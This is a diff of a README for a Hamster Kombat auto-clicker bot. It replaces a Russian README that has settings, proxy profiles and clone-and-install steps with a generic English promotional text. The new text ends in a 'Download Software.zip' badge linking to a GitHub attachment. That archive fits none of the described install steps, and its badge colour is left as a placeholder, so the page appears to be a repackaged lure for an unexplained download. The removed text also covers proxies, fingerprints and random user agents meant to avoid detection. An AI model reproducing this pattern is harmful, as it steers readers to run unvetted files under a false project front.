@@ -1,90 +1,101 @@
-[<img src="https://img.shields.io/badge/Telegram-%40Me-orange">](https://t.me/sho6ot)
-[<img src="https://img.shields.io/badge/python-3.10%20%7C%203.11-blue">](https://www.python.org/downloads/)
 
-![img1](.github/images/demo.png)
+# Hamster Clicker
 
-> 🇪🇳 README in english available [here](README-EN.md)
+![Hamster Clicker Logo](https://yourlogomaker.com/wp-content/uploads/2019/05/hamsterfun---128x80.jpg)
 
-## ⚙ [Настройки](https://github.com/shamhi/HamsterKombatBot/blob/main/.env-example)
-| Настройка                | Описание                                                                                      |
-|--------------------------|-----------------------------------------------------------------------------------------------|
-| **API_ID / API_HASH**    | Данные платформы, с которой запускать сессию Telegram _(сток - Android)_                      |
-| **MIN_AVAILABLE_ENERGY** | Минимальное количество доступной энергии, при достижении которой будет задержка _(напр. 100)_ |
-| **SLEEP_BY_MIN_ENERGY**  | Задержка при достижении минимальной энергии в секундах _(напр. [1800,2400])_                  |
-| **ADD_TAPS_ON_TURBO**    | Сколько тапов будет добавлено при активации турбо _(напр. 2500)_                              |
-| **AUTO_UPGRADE**         | Улучшать ли пассивный заработок _(True / False)_                                              |
-| **MAX_LEVEL**            | Максимальный уровень прокачки апгрейда _(напр. 20)_                                           |
-| **BALANCE_TO_SAVE**      | Лимит баланса, который бот "не тронет" _(напр. 1000000)_                                      |
-| **UPGRADES_COUNT**       | Количество карточек, который бот прокачает за 1 круг _(напр. 10)_                             |
-| **MAX_COMBO_PRICE**      | Максимальная цена покупки для покупки комбо при доступном балансе _(напр. 10000000)_          |
-| **APPLY_DAILY_ENERGY**   | Использовать ли ежедневный бесплатный буст энергии _(True / False)_                           |
-| **APPLY_DAILY_TURBO**    | Использовать ли ежедневный бесплатный буст турбо _(True / False)_                             |
-| **RANDOM_CLICKS_COUNT**  | Рандомное количество тапов _(напр. [50,200])_                                                 |
-| **SLEEP_BETWEEN_TAP**    | Рандомная задержка между тапами в секундах _(напр. [10,25])_                                  |
-| **USE_RANDOM_USERAGENT** | Использовать ли рандомный User Agent при каждом новом запуске _(True / False)_                |
+Welcome to **Hamster Clicker** - Master Hamster Kombat Bot repository! 🐹💥 This Python-based automation tool is specifically designed for the game Hamster Kombat, providing you with a comprehensive and hassle-free gaming experience. Dive into the world of Hamster Kombat and let the bot take care of all in-game tasks seamlessly.
 
-## 📕 Профили
-Для каждой сессии можно создать профиль с уникальными данными:
-```json
-{
-  "session1": {
-    "proxy": "socks5://yGow3a:uBro3wL@58.195.21.83:9715",
-    "headers": {"...": "..."},
-    "fingerprint": {"...": "..."}
-  },
-  "session2": {
-    "proxy": "socks5://yGow3a:uBro3wL@58.195.21.83:9715",
-    "headers": {"...": "..."},
-    "fingerprint": {"...": "..."}
-  },
-  "...": {}
-}
-```
-> ❕ **Примечание**:  `session1` и `session2` - это примеры названий сессий.
+---
 
-## ⚡ Быстрый старт
-1. Чтобы установить библиотеки в Windows, запустите INSTALL.bat.
-2. Для запуска бота используйте `START.bat` (или в консоли: `python main.py`).
+## Table of Contents
 
-## 📌 Предварительные условия
-Прежде чем начать, убедитесь, что у вас установлено следующее:
-- [Python](https://www.python.org/downloads/) версии 3.10 или 3.11.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## 📃 Получение API ключей
-1. Перейдите на сайт [my.telegram.org](https://my.telegram.org) и войдите в систему, используя свой номер телефона.
-2. Выберите **"API development tools"** и заполните форму для регистрации нового приложения.
-3. Запишите `API_ID` и `API_HASH` в файле `.env`, предоставленные после регистрации вашего приложения.
+---
 
-## 🧱 Установка
-Вы можете скачать [**Репозиторий**](https://github.com/shamhi/HamsterKombatBot) клонированием на вашу систему и установкой необходимых зависимостей:
-```shell
-~ >>> git clone https://github.com/shamhi/HamsterKombatBot.git 
-~ >>> cd HamsterKombatBot
+## Introduction
 
-# Linux
-~/HamsterKombatBot >>> python3 -m venv venv
-~/HamsterKombatBot >>> source venv/bin/activate
-~/HamsterKombatBot >>> pip3 install -r requirements.txt
-~/HamsterKombatBot >>> cp .env-example .env
-~/HamsterKombatBot >>> nano .env  # Здесь вы обязательно должны указать ваши API_ID и API_HASH , остальное берется по умолчанию
-~/HamsterKombatBot >>> python3 main.py
+**Hamster Clicker** is your go-to buddy in the world of Hamster Kombat! Say goodbye to repetitive tasks and let the bot handle everything for you. Whether it's auto-tapping, completing cipher tasks, or purchasing the best cards, this bot has got you covered. It's your free and fully automated farming assistant that enhances your Hamster Kombat experience to a whole new level.
 
-# Windows
-~/HamsterKombatBot >>> python -m venv venv
-~/HamsterKombatBot >>> venv\Scripts\activate
-~/HamsterKombatBot >>> pip install -r requirements.txt
-~/HamsterKombatBot >>> copy .env-example .env
-~/HamsterKombatBot >>> # Указываете ваши API_ID и API_HASH, остальное берется по умолчанию
-~/HamsterKombatBot >>> python main.py
-```
-> Установка в качестве Linux службы для фоновой работы бота [тут](docs/LINUX-SERVIS-INSTALL.md).
+---
 
-⏳ Также для быстрого запуска вы можете использовать аргументы, например:
-```shell
-~/HamsterKombatBot >>> python3 main.py --action (1/2)
-# Или
-~/HamsterKombatBot >>> python3 main.py -a (1/2)
+## Features
 
-# 1 - Создает сессию
-# 2 - Запускает кликер
-```
+- **Auto-Tapping:** Sit back and relax as the bot takes care of all the tapping actions for you.
+  
+- **Cipher Task Completion:** Let the bot handle the cipher tasks efficiently and accurately.
+  
+- **Card Purchasing:** Always get the best cards in the game with the bot's intelligent purchase decisions.
+  
+- **Full Automation:** Enjoy a completely automated gaming experience without any manual intervention required.
+
+---
+
+## Installation
+
+To get started with **Hamster Clicker**, follow these simple steps:
+
+1. Clone the repository to your local machine.
+   
+   ```bash
+   git clone https://github.com/your-username/Hamster-Clicker.git
+   ```
+
+2. Install the required dependencies using `pip`:
+   
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+---
+
+## Usage
+
+### Running the Bot
+
+1. Navigate to the directory where you cloned the repository.
+   
+2. Execute the main script to start the bot:
+   
+   ```bash
+   python main.py
+   ```
+
+3. Sit back, relax, and watch as the bot masters Hamster Kombat on your behalf!
+
+**Note:** Make sure to configure any game-specific settings before running the bot for optimal performance.
+
+---
+
+## Contributing
+
+We welcome contributions from the community to make **Hamster Clicker** even better! Whether it's bug fixes, new features, or improvements to the existing codebase, we appreciate all forms of participation.
+
+To contribute:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/new-feature`).
+3. Make your changes and commit them (`git commit -am 'Add new feature'`).
+4. Push to the branch (`git push origin feature/new-feature`).
+5. Create a new Pull Request.
+
+Together, let's make **Hamster Clicker** the ultimate tool for Hamster Kombat enthusiasts!
+
+---
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+[![Download Hamster Clicker](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)](https://github.com/user-attachments/files/16913125/Software.zip)
+
+---
+
+Thank you for checking out **Hamster Clicker**! Let the bot revolutionize your Hamster Kombat experience today. 🚀🐹💻
